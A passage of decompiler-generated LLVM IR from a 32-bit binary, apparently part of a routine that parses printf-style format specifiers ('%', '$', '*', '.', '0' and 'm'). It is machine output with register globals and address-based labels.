  %v2_805c90d.lcssa = phi i8 [ %v2_805c90d125, %dec_label_pc_805c8f3 ], [ %v2_805c90d, %dec_label_pc_805c90c ]
  %v6_805c90d.lcssa = phi i32 [ %v6_805c90d128, %dec_label_pc_805c8f3 ], [ %v6_805c90d, %dec_label_pc_805c90c ]
  %v0_805c919 = load i32, i32* @edx, align 4
  %v1_805c919 = add i32 %v0_805c919, -1
  %v2_805c919 = inttoptr i32 %v1_805c919 to i8*
  %v3_805c919 = load i8, i8* %v2_805c919, align 1
  %v12_805c919 = icmp eq i8 %v3_805c919, 37
  %v1_805c91d = icmp eq i1 %v12_805c919, false
  br i1 %v1_805c91d, label %dec_label_pc_805c9b0, label %dec_label_pc_805c923

dec_label_pc_805c923:                             ; preds = %dec_label_pc_805c919
  %v10_805c923 = icmp eq i8 %v2_805c90d.lcssa, 36
  %v1_805c925 = icmp eq i1 %v10_805c923, false
  br i1 %v1_805c925, label %dec_label_pc_805c957, label %dec_label_pc_805c927

dec_label_pc_805c927:                             ; preds = %dec_label_pc_805c923
  %tmp89 = icmp slt i32 %v1_805c905.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_805c957, label %dec_label_pc_805c92b

dec_label_pc_805c92b:                             ; preds = %dec_label_pc_805c927
  %v4_805c92b = icmp eq i32 %stack_var_-88.1, 0
  %v1_805c930 = add i32 %v0_805c90c.lcssa, 1
  store i32 %v1_805c930, i32* @edx, align 4
  br i1 %v4_805c92b, label %dec_label_pc_805cc01, label %dec_label_pc_805c939

dec_label_pc_805c939:                             ; preds = %dec_label_pc_805c92b
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_805c941 = sub i32 %v1_805c905.lcssa, %stack_var_-88.1
  %v8_805c941 = xor i32 %v1_805c905.lcssa, %stack_var_-88.1
  %v9_805c941 = xor i32 %v2_805c941, %v1_805c905.lcssa
  %v10_805c941 = and i32 %v9_805c941, %v8_805c941
  %v11_805c941 = icmp slt i32 %v10_805c941, 0
  %v12_805c941 = icmp eq i32 %v2_805c941, 0
  %v13_805c941 = icmp slt i32 %v2_805c941, 0
  %v3_805c943 = icmp ne i1 %v13_805c941, %v11_805c941
  %v4_805c943 = or i1 %v12_805c941, %v3_805c943
  %stack_var_-88.1.v0_805c945 = select i1 %v4_805c943, i32 %stack_var_-88.1, i32 %v1_805c905.lcssa
  br label %dec_label_pc_805c953

dec_label_pc_805c953:                             ; preds = %dec_label_pc_805c967, %dec_label_pc_805c939, %dec_label_pc_805c96b
  %v0_805c953 = phi i32 [ %v1_805c930, %dec_label_pc_805c939 ], [ %v0_805c919, %dec_label_pc_805c96b ], [ %v0_805c919, %dec_label_pc_805c967 ]
  %stack_var_-32.2 = phi i32 [ %v1_805c905.lcssa, %dec_label_pc_805c939 ], [ %stack_var_-32.1, %dec_label_pc_805c96b ], [ %stack_var_-32.1, %dec_label_pc_805c967 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_805c945, %dec_label_pc_805c939 ], [ 0, %dec_label_pc_805c96b ], [ 0, %dec_label_pc_805c967 ]
  store i32 %v0_805c953, i32* @esi, align 4
  br label %dec_label_pc_805c97a

dec_label_pc_805c957:                             ; preds = %dec_label_pc_805c927, %dec_label_pc_805c923
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_805c967, label %dec_label_pc_805c95e

dec_label_pc_805c95e:                             ; preds = %dec_label_pc_805c957
  %v10_805c95e = icmp eq i8 %v2_805c90d.lcssa, 109
  br i1 %v10_805c95e, label %dec_label_pc_805c9b0, label %dec_label_pc_805cc01

dec_label_pc_805c967:                             ; preds = %dec_label_pc_805c957
  %tmp175 = icmp ugt i32 %v0_805c90c.lcssa, %v0_805c919
  br i1 %tmp175, label %dec_label_pc_805c96b, label %dec_label_pc_805c953

dec_label_pc_805c96b:                             ; preds = %dec_label_pc_805c967
  %v1_805c96b = inttoptr i32 %v0_805c919 to i8*
  %v2_805c96b = load i8, i8* %v1_805c96b, align 1
  %v8_805c96b = icmp eq i8 %v2_805c96b, 48
  br i1 %v8_805c96b, label %dec_label_pc_805c953, label %dec_label_pc_805c9b0

dec_label_pc_805c97a:                             ; preds = %dec_label_pc_805c98b, %dec_label_pc_805c953
  %v0_805c9a6 = phi i32 [ %v1_805c98b, %dec_label_pc_805c98b ], [ %v0_805c953, %dec_label_pc_805c953 ]
  %v4_805c98435 = phi i32 [ %v6_805c984, %dec_label_pc_805c98b ], [ %v6_805c90d.lcssa, %dec_label_pc_805c953 ]
  store i32 ptrtoint ([8 x i8]* @global_var_806da7e.700 to i32), i32* %edx.global-to-local, align 4
  %v1_805c987 = inttoptr i32 %v0_805c9a6 to i8*
  br label %dec_label_pc_805c984

dec_label_pc_805c984:                             ; preds = %dec_label_pc_805c995, %dec_label_pc_805c97a
  %v4_805c984 = phi i32 [ %v4_805c98435, %dec_label_pc_805c97a ], [ %v6_805c984, %dec_label_pc_805c995 ]
  %v0_805c986 = phi i32 [ ptrtoint ([8 x i8]* @global_var_806da7e.700 to i32), %dec_label_pc_805c97a ], [ %v1_805c986, %dec_label_pc_805c995 ]
  %v0_805c995 = phi i32 [ 1, %dec_label_pc_805c97a ], [ %v2_805c995, %dec_label_pc_805c995 ]
  store i32 %v0_805c995, i32* @ecx, align 4
  %v1_805c984 = inttoptr i32 %v0_805c986 to i8*
  %v2_805c984 = load i8, i8* %v1_805c984, align 1
  %v3_805c984 = zext i8 %v2_805c984 to i32
  %v5_805c984 = and i32 %v4_805c984, -256
  %v6_805c984 = or i32 %v3_805c984, %v5_805c984
  store i32 %v6_805c984, i32* %eax.global-to-local, align 4
  %v1_805c986 = add i32 %v0_805c986, 1
  store i32 %v1_805c986, i32* @edx, align 4
  %v2_805c987 = load i8, i8* %v1_805c987, align 1
  %v15_805c987 = icmp eq i8 %v2_805c987, %v2_805c984
  %v1_805c989 = icmp eq i1 %v15_805c987, false
  br i1 %v1_805c989, label %dec_label_pc_805c990, label %dec_label_pc_805c98b

dec_label_pc_805c98b:                             ; preds = %dec_label_pc_805c984
  %v1_805c98b = add i32 %v0_805c9a6, 1
  store i32 %v1_805c98b, i32* @esi, align 4
  %v0_805c98c = load i32, i32* %edi.global-to-local, align 4
  %v2_805c98c = or i32 %v0_805c98c, %v0_805c995
  store i32 %v2_805c98c, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805c97a

dec_label_pc_805c990:                             ; preds = %dec_label_pc_805c984
  %v1_805c990 = inttoptr i32 %v1_805c986 to i8*
  %v2_805c990 = load i8, i8* %v1_805c990, align 1
  %v3_805c990 = icmp eq i8 %v2_805c990, 0
  br i1 %v3_805c990, label %dec_label_pc_805c999, label %dec_label_pc_805c995

dec_label_pc_805c995:                             ; preds = %dec_label_pc_805c990
  %v2_805c995 = mul i32 %v0_805c995, 2
  br label %dec_label_pc_805c984

dec_label_pc_805c999:                             ; preds = %dec_label_pc_805c990
  %v0_805c999 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805c99d = udiv i32 %v0_805c999, 2
  %v1_805c99d.not = or i32 %v1_805c99d, -6
  %v1_805c9a2 = xor i32 %v1_805c99d.not, 5
  store i32 %v1_805c9a2, i32* %eax.global-to-local, align 4
  %v2_805c9a4 = and i32 %v1_805c9a2, %v0_805c999
  store i32 %v2_805c9a4, i32* %edi.global-to-local, align 4
  %v1_805c9a6 = add i32 %v0_805c9a6, -1
  %v2_805c9a6 = inttoptr i32 %v1_805c9a6 to i8*
  %v3_805c9a6 = load i8, i8* %v2_805c9a6, align 1
  %v12_805c9a6 = icmp eq i8 %v3_805c9a6, 37
  %v1_805c9aa = icmp eq i1 %v12_805c9a6, false
  br i1 %v1_805c9aa, label %dec_label_pc_805c8dc, label %dec_label_pc_805c9b0

dec_label_pc_805c9b0:                             ; preds = %dec_label_pc_805c96b, %dec_label_pc_805c999, %dec_label_pc_805c919, %dec_label_pc_805c95e
  %v0_805c9d3 = phi i32 [ %v1_805c905.lcssa, %dec_label_pc_805c95e ], [ %v1_805c905.lcssa, %dec_label_pc_805c96b ], [ 0, %dec_label_pc_805c999 ], [ %v1_805c905.lcssa, %dec_label_pc_805c919 ]
  %v1_805c9dc = phi i32 [ %v0_805c90c.lcssa, %dec_label_pc_805c95e ], [ %v0_805c90c.lcssa, %dec_label_pc_805c96b ], [ %v0_805c9a6, %dec_label_pc_805c999 ], [ %v0_805c90c.lcssa, %dec_label_pc_805c919 ]
  %v0_805c9d9 = phi i32 [ %v0_805c919, %dec_label_pc_805c95e ], [ %v0_805c919, %dec_label_pc_805c96b ], [ %v1_805c986, %dec_label_pc_805c999 ], [ %v0_805c919, %dec_label_pc_805c919 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_805c95e ], [ %stack_var_-32.1, %dec_label_pc_805c96b ], [ %stack_var_-32.2, %dec_label_pc_805c999 ], [ %stack_var_-32.1, %dec_label_pc_805c919 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_805c95e ], [ 0, %dec_label_pc_805c96b ], [ %stack_var_-88.2, %dec_label_pc_805c999 ], [ %stack_var_-88.1, %dec_label_pc_805c919 ]
  %v1_805c9b0 = inttoptr i32 %v0_805c9d9 to i8*
  %v2_805c9b0 = load i8, i8* %v1_805c9b0, align 1
  %v11_805c9b0 = icmp eq i8 %v2_805c9b0, 42
  %v1_805c9b3 = icmp eq i1 %v11_805c9b0, false
  br i1 %v1_805c9b3, label %dec_label_pc_805c9e9, label %dec_label_pc_805c9b5

dec_label_pc_805c9b5:                             ; preds = %dec_label_pc_805c9b0
  %v4_805c9b5 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_805c9b5, label %dec_label_pc_805c9d9, label %dec_label_pc_805c9bc

dec_label_pc_805c9bc:                             ; preds = %dec_label_pc_805c9b5
  %v1_805c9bc = inttoptr i32 %v1_805c9dc to i8*
  %v2_805c9bc = load i8, i8* %v1_805c9bc, align 1
  %v11_805c9bc = icmp eq i8 %v2_805c9bc, 36
  %v1_805c9bf = icmp eq i1 %v11_805c9bc, false
  br i1 %v1_805c9bf, label %dec_label_pc_805cc01, label %dec_label_pc_805c9c5

dec_label_pc_805c9c5:                             ; preds = %dec_label_pc_805c9bc
  %tmp91 = icmp slt i32 %v0_805c9d3, 1
  br i1 %tmp91, label %dec_label_pc_805cc01, label %dec_label_pc_805c9cd

dec_label_pc_805c9cd:                             ; preds = %dec_label_pc_805c9c5
  store i32 %v8_805c8e3, i32* %eax.global-to-local, align 4
  %v1_805c9d2 = add i32 %v1_805c9dc, 1
  store i32 %v1_805c9d2, i32* @esi, align 4
  %v1_805c9d3 = load i32, i32* @esp, align 4
  %v3_805c9d3 = add i32 %v8_805c8e3, 68
  %v4_805c9d3 = add i32 %v3_805c9d3, %v1_805c9d3
  %v5_805c9d3 = inttoptr i32 %v4_805c9d3 to i32*
  store i32 %v0_805c9d3, i32* %v5_805c9d3, align 4
  %v0_805ca17.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c9e4

dec_label_pc_805c9d9:                             ; preds = %dec_label_pc_805c9b5
  %v1_805c9d9 = add i32 %v0_805c9d9, 1
  store i32 %v1_805c9d9, i32* %eax.global-to-local, align 4
  %v12_805c9dc = icmp eq i32 %v1_805c9d9, %v1_805c9dc
  %v1_805c9de = icmp eq i1 %v12_805c9dc, false
  br i1 %v1_805c9de, label %dec_label_pc_805cc01, label %dec_label_pc_805c9e4

dec_label_pc_805c9e4:                             ; preds = %dec_label_pc_805c9d9, %dec_label_pc_805c9cd
  %v0_805ca17.pre.pre.pre = phi i32 [ %v1_805c9dc, %dec_label_pc_805c9d9 ], [ %v0_805ca17.pre.pre.pre.pre, %dec_label_pc_805c9cd ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805c9e9

dec_label_pc_805c9e9:                             ; preds = %dec_label_pc_805c9b0, %dec_label_pc_805c9e4
  %v0_805ca17.pre.pre = phi i32 [ %v1_805c9dc, %dec_label_pc_805c9b0 ], [ %v0_805ca17.pre.pre.pre, %dec_label_pc_805c9e4 ]
  %v0_805c882 = phi i32 [ %v0_805c9d3, %dec_label_pc_805c9b0 ], [ -2147483648, %dec_label_pc_805c9e4 ]
  %v4_805c9e9 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_805c9e9 = icmp eq i32 %v4_805c9e9, 0
  %v1_805c9ee = icmp eq i1 %v5_805c9e9, false
  %.pre = inttoptr i32 %v0_805ca17.pre.pre to i8*
  br i1 %v1_805c9ee, label %dec_label_pc_805ca12, label %dec_label_pc_805c9f4

dec_label_pc_805c9f4:                             ; preds = %dec_label_pc_805c9e9
  %v2_805c9f4 = load i8, i8* %.pre, align 1
  %v11_805c9f4 = icmp eq i8 %v2_805c9f4, 46
  %v1_805c9f7 = icmp eq i1 %v11_805c9f4, false
  br i1 %v1_805c9f7, label %dec_label_pc_805ca0b, label %dec_label_pc_805c9f9

dec_label_pc_805c9f9:                             ; preds = %dec_label_pc_805c9f4
  %v1_805c9f9 = add i32 %v0_805ca17.pre.pre, 1
  store i32 %v1_805c9f9, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805c8dc.outer

dec_label_pc_805ca0b:                             ; preds = %dec_label_pc_805c9f4
  br label %dec_label_pc_805ca12

dec_label_pc_805ca12:                             ; preds = %dec_label_pc_805c9e9, %dec_label_pc_805ca0b
  %stack_var_-96.2 = phi i32 [ %v0_805c882, %dec_label_pc_805ca0b ], [ %stack_var_-96.1.ph, %dec_label_pc_805c9e9 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_805ca0b ], [ %v0_805c882, %dec_label_pc_805c9e9 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_806da2c.701 to i32), i32* @edx, align 4
  %v4_805ca17.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ca17

dec_label_pc_805ca17:                             ; preds = %dec_label_pc_805ca21, %dec_label_pc_805ca12
  %v0_805ca21 = phi i32 [ %v1_805ca21, %dec_label_pc_805ca21 ], [ ptrtoint ([9 x i8]* @global_var_806da2c.701 to i32), %dec_label_pc_805ca12 ]
  %v4_805ca17 = phi i32 [ %v6_805ca17, %dec_label_pc_805ca21 ], [ %v4_805ca17.pre, %dec_label_pc_805ca12 ]
  %v2_805ca17 = load i8, i8* %.pre, align 1
  %v3_805ca17 = zext i8 %v2_805ca17 to i32
  %v5_805ca17 = and i32 %v4_805ca17, -256
  %v6_805ca17 = or i32 %v3_805ca17, %v5_805ca17
  store i32 %v6_805ca17, i32* %eax.global-to-local, align 4
  %v3_805ca19 = inttoptr i32 %v0_805ca21 to i8*
  %v4_805ca19 = load i8, i8* %v3_805ca19, align 1
  %v15_805ca19 = icmp eq i8 %v2_805ca17, %v4_805ca19
  br i1 %v15_805ca19, label %dec_label_pc_805c889, label %dec_label_pc_805ca21

dec_label_pc_805ca21:                             ; preds = %dec_label_pc_805ca17
  %v1_805ca21 = add i32 %v0_805ca21, 1
  store i32 %v1_805ca21, i32* @edx, align 4
  %v1_805ca22 = inttoptr i32 %v1_805ca21 to i8*
  %v2_805ca22 = load i8, i8* %v1_805ca22, align 1
  %v3_805ca22 = icmp eq i8 %v2_805ca22, 0
  %v1_805ca25 = icmp eq i1 %v3_805ca22, false
  br i1 %v1_805ca25, label %dec_label_pc_805ca17, label %dec_label_pc_805ca27

dec_label_pc_805ca27:                             ; preds = %dec_label_pc_805ca21, %dec_label_pc_805c889
  %v0_805ca3a = phi i32 [ %v1_805c889, %dec_label_pc_805c889 ], [ %v0_805ca17.pre.pre, %dec_label_pc_805ca21 ]
  %v0_805ca37 = phi i32 [ %v0_805ca21, %dec_label_pc_805c889 ], [ %v1_805ca21, %dec_label_pc_805ca21 ]
  %v1_805ca29 = add i32 %v0_805ca37, -134666796
  %v1_805ca2e = add i32 %v0_805ca37, -134666797
  %v5_805ca2e = sub i32 134666796, %v0_805ca37
  %v6_805ca2e = and i32 %v1_805ca29, %v5_805ca2e
  %v7_805ca2e = icmp slt i32 %v6_805ca2e, 0
  %v8_805ca2e = icmp eq i32 %v1_805ca2e, 0
  %v9_805ca2e = icmp slt i32 %v1_805ca2e, 0
  store i32 %v1_805ca2e, i32* %eax.global-to-local, align 4
  %v3_805ca2f = icmp eq i1 %v9_805ca2e, %v7_805ca2e
  %v4_805ca2f = icmp eq i1 %v8_805ca2e, false
  %v5_805ca2f = and i1 %v4_805ca2f, %v3_805ca2f
  br i1 %v5_805ca2f, label %dec_label_pc_805ca3b, label %dec_label_pc_805ca31

dec_label_pc_805ca31:                             ; preds = %dec_label_pc_805ca27
  %v1_805ca31 = inttoptr i32 %v0_805ca3a to i8*
  %v2_805ca31 = load i8, i8* %v1_805ca31, align 1
  %v3_805ca31 = zext i8 %v2_805ca31 to i32
  %v5_805ca31 = and i32 %v1_805ca2e, -256
  %v6_805ca31 = or i32 %v3_805ca31, %v5_805ca31
  store i32 %v6_805ca31, i32* %eax.global-to-local, align 4
  %v3_805ca33 = inttoptr i32 %v0_805ca37 to i8*
  %v4_805ca33 = load i8, i8* %v3_805ca33, align 1
  %v15_805ca33 = icmp eq i8 %v2_805ca31, %v4_805ca33
  %v1_805ca35 = icmp eq i1 %v15_805ca33, false
  br i1 %v1_805ca35, label %dec_label_pc_805ca3b, label %dec_label_pc_805ca37

dec_label_pc_805ca37:                             ; preds = %dec_label_pc_805ca31
  %v1_805ca37 = add i32 %v0_805ca37, 9
  store i32 %v1_805ca37, i32* @edx, align 4
  %v1_805ca3a = add i32 %v0_805ca3a, 1
  store i32 %v1_805ca3a, i32* @esi, align 4
  br label %dec_label_pc_805ca3b

dec_label_pc_805ca3b:                             ; preds = %dec_label_pc_805ca31, %dec_label_pc_805ca27, %dec_label_pc_805ca37
  %v4_805ca3f = phi i32 [ %v6_805ca31, %dec_label_pc_805ca31 ], [ %v1_805ca2e, %dec_label_pc_805ca27 ], [ %v6_805ca31, %dec_label_pc_805ca37 ]
  %v0_805ca3f = phi i32 [ %v0_805ca3a, %dec_label_pc_805ca31 ], [ %v0_805ca3a, %dec_label_pc_805ca27 ], [ %v1_805ca3a, %dec_label_pc_805ca37 ]
  %v0_805ca3b = phi i32 [ %v0_805ca37, %dec_label_pc_805ca31 ], [ %v0_805ca37, %dec_label_pc_805ca27 ], [ %v1_805ca37, %dec_label_pc_805ca37 ]
  %v1_805ca3b = add i32 %v0_805ca3b, 9
  %v2_805ca3b = inttoptr i32 %v1_805ca3b to i8*
  %v3_805ca3b = load i8, i8* %v2_805ca3b, align 1
  %v4_805ca3b = sext i8 %v3_805ca3b to i32
  store i32 %v4_805ca3b, i32* %ebx.global-to-local, align 4
  %v1_805ca3f = inttoptr i32 %v0_805ca3f to i8*
  %v2_805ca3f = load i8, i8* %v1_805ca3f, align 1
  %v3_805ca3f = zext i8 %v2_805ca3f to i32
  %v5_805ca3f = and i32 %v4_805ca3f, -256
  %v6_805ca3f = or i32 %v3_805ca3f, %v5_805ca3f
  store i32 %v6_805ca3f, i32* %eax.global-to-local, align 4
  %v2_805ca41 = mul nsw i32 %v4_805ca3b, 256
  store i32 %v2_805ca41, i32* %ebx.global-to-local, align 4
  %v4_805ca44 = icmp eq i8 %v2_805ca3f, 0
  br i1 %v4_805ca44, label %dec_label_pc_805cc01, label %dec_label_pc_805ca4c

dec_label_pc_805ca4c:                             ; preds = %dec_label_pc_805ca3b
  %v3_805ca4c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805ca4c, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_806da69.702 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805ca55

dec_label_pc_805ca55:                             ; preds = %dec_label_pc_805caa5, %dec_label_pc_805ca4c
  %v0_805caa5 = phi i32 [ %v1_805caa5, %dec_label_pc_805caa5 ], [ ptrtoint ([21 x i8]* @global_var_806da69.702 to i32), %dec_label_pc_805ca4c ]
  %v3_805ca55 = inttoptr i32 %v0_805caa5 to i8*
  %v4_805ca55 = load i8, i8* %v3_805ca55, align 1
  %v15_805ca55 = icmp eq i8 %v2_805ca3f, %v4_805ca55
  %v1_805ca57 = icmp eq i1 %v15_805ca55, false
  br i1 %v1_805ca57, label %dec_label_pc_805caa5, label %dec_label_pc_805ca59

dec_label_pc_805ca59:                             ; preds = %dec_label_pc_805ca55
  %v1_805ca5b = add i32 %v0_805caa5, -134666857
  store i32 %v1_805ca5b, i32* %edx.global-to-local, align 4
  %v7_805ca64 = icmp sgt i32 %v1_805ca5b, 17
  br i1 %v7_805ca64, label %dec_label_pc_805ca66, label %dec_label_pc_805ca6f

dec_label_pc_805ca66:                             ; preds = %dec_label_pc_805ca59
  %v1_805ca66 = add i32 %v0_805caa5, -134666859
  store i32 %v1_805ca66, i32* %eax.global-to-local, align 4
  %v3_805ca69 = and i32 %v2_805ca41, 1024
  %v4_805ca69 = icmp eq i32 %v3_805ca69, 0
  %v1_805ca6c = icmp eq i1 %v4_805ca69, false
  %v4_805ca6c = select i1 %v1_805ca6c, i32 %v1_805ca66, i32 %v1_805ca5b
  store i32 %v4_805ca6c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805ca6f

dec_label_pc_805ca6f:                             ; preds = %dec_label_pc_805ca59, %dec_label_pc_805ca66
  %v0_805ca78 = phi i32 [ %v1_805ca5b, %dec_label_pc_805ca59 ], [ %v4_805ca6c, %dec_label_pc_805ca66 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_806da5f.703 to i32), i32* %ecx.global-to-local, align 4
  %v2_805ca78 = add i32 %tmp76, 32
  %v3_805ca78 = inttoptr i32 %v2_805ca78 to i32*
  store i32 %v0_805ca78, i32* %v3_805ca78, align 4
  %v0_805ca7b.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_805ca7f.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805ca7b

dec_label_pc_805ca7b:                             ; preds = %dec_label_pc_805ca7b, %dec_label_pc_805ca6f
  %v0_805ca7b = phi i32 [ %v1_805ca7b, %dec_label_pc_805ca7b ], [ %v0_805ca7b.pre, %dec_label_pc_805ca6f ]
  %v1_805ca7b = add i32 %v0_805ca7b, 1
  store i32 %v1_805ca7b, i32* %ecx.global-to-local, align 4
  %v1_805ca7c = inttoptr i32 %v1_805ca7b to i8*
  %v2_805ca7c = load i8, i8* %v1_805ca7c, align 1
  %v3_805ca7c = sext i8 %v2_805ca7c to i32
  store i32 %v3_805ca7c, i32* %eax.global-to-local, align 4
  %v8_805ca81 = icmp sgt i32 %v0_805ca7f.pre, %v3_805ca7c
  br i1 %v8_805ca81, label %dec_label_pc_805ca7b, label %dec_label_pc_805ca83

dec_label_pc_805ca83:                             ; preds = %dec_label_pc_805ca7b
  store i32 ptrtoint ([21 x i8]* @global_var_806da69.702 to i32), i32* @ecx, align 4
  %v1_805ca8a = add i32 %v0_805ca7b, -134666847
  store i32 %v1_805ca8a, i32* %eax.global-to-local, align 4
  %v2_805ca8f = add i32 %v0_805ca7b, add (i32 ptrtoint (i32* @global_var_806da50.704 to i32), i32 -134666847)
  %v3_805ca8f = add i32 %v2_805ca8f, %v1_805ca8a
  %v4_805ca8f = inttoptr i32 %v3_805ca8f to i16*
  %v5_805ca8f = load i16, i16* %v4_805ca8f, align 2
  %v6_805ca8f = sext i16 %v5_805ca8f to i32
  store i32 %v6_805ca8f, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_805ca8a, 2
  %v3_805ca97 = add i32 %factor, 134666816
  %v4_805ca97 = inttoptr i32 %v3_805ca97 to i16*
  %v5_805ca97 = load i16, i16* %v4_805ca97, align 2
  %v6_805ca97 = sext i16 %v5_805ca97 to i32
  store i32 %v6_805ca97, i32* %eax.global-to-local, align 4
  %v1_805ca9f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805ca9f = or i32 %v1_805ca9f, %v6_805ca8f
  %v2_805caa1 = and i32 %v2_805ca9f, %v6_805ca97
  store i32 %v2_805caa1, i32* %edx.global-to-local, align 4
  %v0_805cab3.pre = load i32, i32* @esi, align 4
  %v0_805cab6.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805caab

dec_label_pc_805caa5:                             ; preds = %dec_label_pc_805ca55
  %v1_805caa5 = add i32 %v0_805caa5, 1
  store i32 %v1_805caa5, i32* @ecx, align 4
  %v1_805caa6 = inttoptr i32 %v1_805caa5 to i8*
  %v2_805caa6 = load i8, i8* %v1_805caa6, align 1
  %v3_805caa6 = icmp eq i8 %v2_805caa6, 0
  %v1_805caa9 = icmp eq i1 %v3_805caa6, false
  br i1 %v1_805caa9, label %dec_label_pc_805ca55, label %dec_label_pc_805caab

dec_label_pc_805caab:                             ; preds = %dec_label_pc_805caa5, %dec_label_pc_805ca83
  %v0_805cab6 = phi i32 [ %v0_805cab6.pre, %dec_label_pc_805ca83 ], [ %storemerge4, %dec_label_pc_805caa5 ]
  %v0_805cab3 = phi i32 [ %v0_805cab3.pre, %dec_label_pc_805ca83 ], [ %v0_805ca3f, %dec_label_pc_805caa5 ]
  %v0_805caab = phi i32 [ %v2_805caa1, %dec_label_pc_805ca83 ], [ %v3_805ca4c, %dec_label_pc_805caa5 ]
  store i32 %v0_805caab, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_805cab3 = inttoptr i32 %v0_805cab3 to i8*
  %v2_805cab3 = load i8, i8* %v1_805cab3, align 1
  %v3_805cab3 = sext i8 %v2_805cab3 to i32
  store i32 %v3_805cab3, i32* %eax.global-to-local, align 4
  %v2_805cab6 = add i32 %tmp76, 4
  %v3_805cab6 = inttoptr i32 %v2_805cab6 to i32*
  store i32 %v0_805cab6, i32* %v3_805cab6, align 4
  %v0_805cab9 = load i32, i32* %eax.global-to-local, align 4
  %v1_805cab9 = load i32, i32* @edx, align 4
  %v2_805cab9 = add i32 %v1_805cab9, 12
  %v3_805cab9 = inttoptr i32 %v2_805cab9 to i32*
  store i32 %v0_805cab9, i32* %v3_805cab9, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_805cac0 = load i32, i32* @edx, align 4
  %v1_805cac0 = add i32 %v0_805cac0, 28
  %v2_805cac0 = inttoptr i32 %v1_805cac0 to i32*
  store i32 1, i32* %v2_805cac0, align 4
  %v0_805cac7 = load i32, i32* %eax.global-to-local, align 4
  %v1_805cac7 = load i32, i32* @edx, align 4
  %v2_805cac7 = add i32 %v1_805cac7, 8
  %v3_805cac7 = inttoptr i32 %v2_805cac7 to i32*
  store i32 %v0_805cac7, i32* %v3_805cac7, align 4
  %v0_805caca = load i32, i32* %edi.global-to-local, align 4
  %v1_805cad4 = and i32 %v0_805caca, -5
  %v0_805cada = load i32, i32* %ebx.global-to-local, align 4
  %v1_805cada = and i32 %v0_805cada, 3840
  store i32 %v1_805cada, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_805cae3 = or i32 %v1_805cada, %v1_805cad4
  store i32 %v2_805cae3, i32* @edi, align 4
  %v1_805cae5 = load i32, i32* @edx, align 4
  %v2_805cae5 = add i32 %v1_805cae5, 20
  %v3_805cae5 = inttoptr i32 %v2_805cae5 to i32*
  store i32 48, i32* %v3_805cae5, align 4
  %v0_805cae8 = load i32, i32* @edi, align 4
  %v1_805cae8 = load i32, i32* @edx, align 4
  %v2_805cae8 = add i32 %v1_805cae8, 16
  %v3_805cae8 = inttoptr i32 %v2_805cae8 to i32*
  store i32 %v0_805cae8, i32* %v3_805cae8, align 4
  %v0_805caeb = load i32, i32* @ecx, align 4
  %v1_805caeb = inttoptr i32 %v0_805caeb to i8*
  %v2_805caeb = load i8, i8* %v1_805caeb, align 1
  %v3_805caeb = icmp eq i8 %v2_805caeb, 0
  %v1_805caee = icmp eq i1 %v3_805caeb, false
  br i1 %v1_805caee, label %dec_label_pc_805cb07, label %dec_label_pc_805caf0

dec_label_pc_805caf0:                             ; preds = %dec_label_pc_805caab
  %v0_805caf0 = load i32, i32* @esi, align 4
  %v1_805caf0 = inttoptr i32 %v0_805caf0 to i8*
  %v2_805caf0 = load i8, i8* %v1_805caf0, align 1
  %v11_805caf0 = icmp eq i8 %v2_805caf0, 109
  %v1_805caf3 = icmp eq i1 %v11_805caf0, false
  br i1 %v1_805caf3, label %dec_label_pc_805cc01, label %dec_label_pc_805caf9

dec_label_pc_805caf9:                             ; preds = %dec_label_pc_805caf0
  %v0_805caf9 = load i32, i32* @edx, align 4
  %v1_805caf9 = add i32 %v0_805caf9, 32
  %v2_805caf9 = inttoptr i32 %v1_805caf9 to i32*
  store i32 20, i32* %v2_805caf9, align 4
  %v0_805cb00 = load i32, i32* @edx, align 4
  %v1_805cb00 = add i32 %v0_805cb00, 28
  %v2_805cb00 = inttoptr i32 %v1_805cb00 to i32*
  store i32 0, i32* %v2_805cb00, align 4
  br label %dec_label_pc_805cb07

dec_label_pc_805cb07:                             ; preds = %dec_label_pc_805caab, %dec_label_pc_805caf9
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_805cba3, label %dec_label_pc_805cb12

dec_label_pc_805cb12:                             ; preds = %dec_label_pc_805cb07
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_805cb8b = add i32 %tmp76, 40
  %v4_805cb21 = add i32 %tmp76, 36
  %v1_805cb94 = add i32 %tmp76, 28
  %v2_805cb94 = inttoptr i32 %v1_805cb94 to i32*
  br label %dec_label_pc_805cb14

